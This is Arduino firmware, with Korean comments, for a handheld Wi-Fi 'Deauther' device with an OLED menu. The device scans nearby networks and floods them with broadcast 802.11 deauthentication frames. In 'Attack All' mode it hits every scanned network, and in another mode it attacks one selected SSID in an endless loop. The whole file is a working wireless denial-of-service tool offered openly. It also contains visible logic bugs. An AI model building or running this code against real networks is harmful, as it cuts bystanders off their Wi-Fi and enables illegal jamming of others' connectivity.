#undef max
#undef min
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include "thread"
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

#define SSD1306_I2C_ADDRESS 0x3C  // I2C 주소 정의

#define BUTTON_OK PA13
#define BUTTON_SCROLL_UP PA27
#define BUTTON_SCROLL_DOWN PA12
#define BUTTON_MENU PB2      // OK 버튼

#define LINE_HEIGHT 10  
#define AP_MENU      0
#define ATTACK_MENU  1
#define ALL_ATTACK_MENU   4
#define SCAN_MENU    2
#define SETTING_MENU 3 
#define MENU_COUNT   5 
#define LINE_HEIGHT 10
int sendCount = 35;
String selectedSSID;
bool deauther_rr = false;
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;
char *ssid = "Warwick";
char *pass = "warwickisbest";
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
int scrollIndex = 0;
int currentMenu = AP_MENU;
bool apMode = false;
bool attackMode = false;
bool scanMode = false; 
bool allattackMode = false;
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 200; 
bool settingMode = false;
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  pinMode(BUTTON_SCROLL_DOWN, INPUT_PULLUP); // 스크롤 다운
  pinMode(BUTTON_MENU, INPUT_PULLUP);        // 메뉴 전환
  pinMode(BUTTON_SCROLL_UP, INPUT_PULLUP);
  pinMode(BUTTON_OK, INPUT_PULLUP);
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  if(!display.begin(SSD1306_I2C_ADDRESS, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;); // 무한 루프
  }

  display.clearDisplay();
  
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Scanning....");
  
  display.display();  // 화면 업데이트
  
  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }

  #ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  if (!scan_results.empty()) {
        selectedSSID = scan_results[0].ssid; // 첫 번째 SSID로 초기화
  }
  #endif
  server.begin();
  wifi_off();
  wifi_on(RTW_MODE_STA);
}
int a = 0;
bool deauther_r = false;
void loop() {
    unsigned long currentMillis = millis();
    if (deauther_r){
      deauth_reason = 14;
      for (const auto& result : scan_results) {
        current_channel = result.channel;
        WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
        //delay(20);
        memcpy(deauth_bssid, result.bssid, 6);
        DEBUG_SER_PRINT("Sending Deauth-Attack on: " + result.ssid + "\n");
        display.setCursor(0, 16);
        //display.println("Attack Mode");
        if (result.ssid.length() == 0) {
            display.println("Attack on: *hidden");
        }
        else {
          display.println("Attack on:" + result.ssid);
          }
        display.display();
        deauth_reason = 1;
        int deauth_reason2 = 14;
        //xTaskCreate(sendDeauthFrames, "SendDeauthFrames", 2048, NULL, 1, NULL);
        for (int i = 0; i < 50; i++) {  // 전송 횟수를 조정
          //delay(5);
          wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        }
        display.clearDisplay();
      }
    }
    if (deauther_rr) {
      deauth_reason = 1;
      for (int i = 0; scan_results.size(); i++) {
        
        current_channel = scan_results[i].channel;
        display.setCursor(0, 16);
        deauth_reason = 1;
        if (scan_results[i].ssid == selectedSSID){
          display.clearDisplay();
          display.setTextSize(1);
          display.setTextColor(SSD1306_WHITE);
          display.setCursor(0, 0);
          display.println("Attack on:");
          display.setCursor(0, 20);
          display.println(selectedSSID);
          display.display();
          while (true) {
             WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
             memcpy(deauth_bssid, scan_results[i].bssid, 6);
             DEBUG_SER_PRINT("Sending Deauth-Attack on: " + scan_results[i].ssid + "\n");
             wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
          }
        
        }
        
      }
    }
    // 메뉴 전환 버튼 처리
    if (digitalRead(BUTTON_MENU) == LOW && (currentMillis - lastButtonPress) > debounceDelay) {
        lastButtonPress = currentMillis;
        currentMenu = (currentMenu + 1) % MENU_COUNT; // 메뉴 순환
        apMode = false;     
        attackMode = false;  
        settingMode = false;
        scanMode = false;
        Serial.print("메뉴 전환: ");
        Serial.println(getMenuName(currentMenu));
        displayMenu();
    }

    // 스크롤 다운 버튼 처리
    if (digitalRead(BUTTON_SCROLL_DOWN) == LOW && (currentMillis - lastButtonPress) > debounceDelay) {
        lastButtonPress = currentMillis;
        if (currentMenu == AP_MENU && apMode) {
            if (scrollIndex < (int)(scan_results.size() - (SCREEN_HEIGHT / LINE_HEIGHT))) {
                scrollIndex++;
                Serial.print("스크롤 다운: ");
                Serial.println(scrollIndex);
                displayWiFiScanResults();
            }
        }
        else if (currentMenu == ATTACK_MENU && attackMode) {
            Serial.println("Attack 모드: 스크롤 다운 버튼 눌림");

        }
        else if (currentMenu == SETTING_MENU) {
            if (scrollIndex < scan_results.size() - 1) {
              if (scrollIndex == scan_results.size() - 1 ){
                scrollIndex--; // 스크롤 인덱스 증가
                Serial.print("Scroll Down: ");
                Serial.println(scrollIndex);
                selectedSSID = scan_results[scrollIndex].ssid;
                displaySetting(); // 설정 화면 업데이트
              }
              else{
                scrollIndex++;
                Serial.print("Scroll Down: ");
                Serial.println(scrollIndex);
                selectedSSID = scan_results[scrollIndex].ssid;
                displaySetting(); // 설정 화면 업데이트
                }
            }
            
        }

    }

    // 스크롤 업 버튼 처리
    if (digitalRead(BUTTON_SCROLL_UP) == LOW && (currentMillis - lastButtonPress) > debounceDelay) {
        lastButtonPress = currentMillis;
        if (currentMenu == AP_MENU && apMode) {
            if (scrollIndex > 0) {
                scrollIndex--;
                Serial.print("스크롤 업: ");
                Serial.println(scrollIndex);
                displayWiFiScanResults();
            }
        }
        else if (currentMenu == ATTACK_MENU && attackMode) {
            Serial.println("Attack 모드: 스크롤 업 버튼 눌림");
        }
  
        else if (currentMenu == SETTING_MENU) {
            if (scrollIndex <= scan_results.size()) {
                if (scrollIndex > 0){
                  scrollIndex--; // 스크롤 인덱스 증가
                  
                  Serial.print("UP: ");
                  Serial.println(scrollIndex);
                  selectedSSID = scan_results[scrollIndex].ssid;
                  displaySetting(); // 설정 화면 업데이트
                  }
            }
        }
    }

    // OK 버튼 처리
      if (digitalRead(BUTTON_OK) == LOW && (currentMillis - lastButtonPress) > debounceDelay) {
          lastButtonPress = currentMillis;
          Serial.println("ok");
          if (!apMode && !attackMode && !settingMode && !scanMode && !allattackMode) {
              // 메뉴에서 OK 버튼을 눌러 선택한 메뉴로 진입
              if (currentMenu == AP_MENU) {
                  apMode = true;
                  scrollIndex = 0; // 스크롤 인덱스 초기화
                  Serial.println("AP 모드 활성화");
                  displayWiFiScanResults();
              }
              else if (currentMenu == ATTACK_MENU) {
                  attackMode = true;
                  scrollIndex = 0; // 스크롤 인덱스 초기화
                  Serial.println("Attack 모드 활성화");
                  displayAttackMode();
              }
              else if (currentMenu == SETTING_MENU) { // 설정 메뉴 처리 추가
                  settingMode = true;
                  scrollIndex = 0; // 스크롤 인덱스 초기화
                  displaySetting(); // 설정 화면 표시
              }
              else if (currentMenu == SCAN_MENU) { // 스캔 메뉴 처리 추가
                  scanMode = true;
                  scrollIndex = 0; // 스크롤 인덱스 초기화
                  displayScan(); // 스캔 화면 표시
              }
              else if (currentMenu == ALL_ATTACK_MENU){
                allattackMode = true;
                scrollIndex = 0;
                deauther_r = true;
                }
          }
          else if (attackMode) {
                deauther_rr = false; // 공격 중지
                Serial.println("공격이 중지되었습니다.");
                display.clearDisplay();
                display.setCursor(0, 0);
                display.println("공격 중지됨");
                display.display();
          }
          else if (settingMode){
            if (scrollIndex <= scan_results.size()){
              selectedSSID = scan_results[scrollIndex].ssid;
              Serial.println(selectedSSID);
              }
              displaySetting();
            }   
          else {
              // AP 또는 Attack 모드에서 OK 버튼을 눌러 메뉴로 돌아감
            
              apMode = false;
              attackMode = false;
              settingMode = false;
              scanMode = false;
              deauther_rr = false;
              Serial.println("메뉴로 돌아감");
              displayMenu();
          }
      }

    // 현재 메뉴에 따라 동작
    if (currentMenu == AP_MENU) {
        if (apMode) {
          displayWiFiScanResults();
        }
        else {
            displayMenu(); // 메뉴 표시 함수
        }
    }
    else if (currentMenu == ATTACK_MENU) {
        if (attackMode) {
            displayAttackMode();
        }
        else {
            displayMenu();
        }
    }
    else if (currentMenu == SETTING_MENU) {
      if (settingMode) {
        displaySetting();
        
        
        }
     else {
      displayMenu();
      }
    }
    else if (currentMenu == SETTING_MENU) {
      if (scanMode) {
        displayScan();        
        }
     else {
      displayMenu();
      }
   }      
}
// 메뉴 이름 반환 함수
String getMenuName(int menu) {
    switch(menu) {
        case AP_MENU:
            return "AP";
        case ATTACK_MENU:
            return "Attack";
        case SETTING_MENU:
            return "Settings";
        case SCAN_MENU:    
            return "Scan";
        case ALL_ATTACK_MENU:
            return "Attack All";
        //default:
            //return "Unknown";
    }
}

// 메뉴를 표시하는 함수
void displayMenu() {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("5G/2.4G Deauther :>");
    display.setCursor(0, 16);
    for (int i = 0; i < MENU_COUNT; i++) {
        if (i == currentMenu) {
            display.print("> ");
        }
        else {
            display.print("  ");
        }
        display.println(getMenuName(i));
    }
    display.display();
    //Serial.println("메뉴 표시");
}
void displaySetting() {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("Setting:");
    display.setCursor(0, 16);
    //display.print("Send Count: ");
    //display.println(sendCount);
    //display.setCursor(0, 36);
    display.print("Selected SSID: ");
    if (selectedSSID.length() == 0){
        display.println("*hidden");
      }
    display.println(selectedSSID);
    display.display();
}
void displayWiFiScanResults() {
    display.clearDisplay(); // 화면 초기화

    // "Back" 버튼 표시
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("< Back");

    // 현재 스크롤 위치에 따라 SSID 출력
    for (int i = scrollIndex; i < scrollIndex + (SCREEN_HEIGHT / LINE_HEIGHT) - 1 && i < (int)scan_results.size(); i++) {
        int y = (i - scrollIndex + 1) * LINE_HEIGHT;
        display.setCursor(0, y);

        // SSID가 비어있다면 *hidden으로 출력
        if (scan_results[i].ssid.length() == 0) {
            display.println("*Hidden");
        }
        else {
            String ssid = scan_results[i].ssid;
            if (ssid.length() > 15) {
                ssid = ssid.substring(0, 10) + "..."; 
            }
            display.println(String(i));
            if (i < 10){
              display.setCursor(10,y);
              }
            else{
              
              display.setCursor(16, y);
              }
            display.println(ssid);
        }
    }

    display.display();
    Serial.println("Wi-Fi 스캔 결과 표시");
}


void displayScan() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("< Back");
  display.setCursor(0,16);
  display.println("Scanning...");
  display.display();
  scanNetworks();
  display.setCursor(0,26);
  display.println("Done!");
  display.display();
  }

void displayAttackMode() {
  delay(10);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.setCursor(0, 16);
  display.display();
  Serial.println("Attack 모드 표시");
  deauther_rr = true;
}
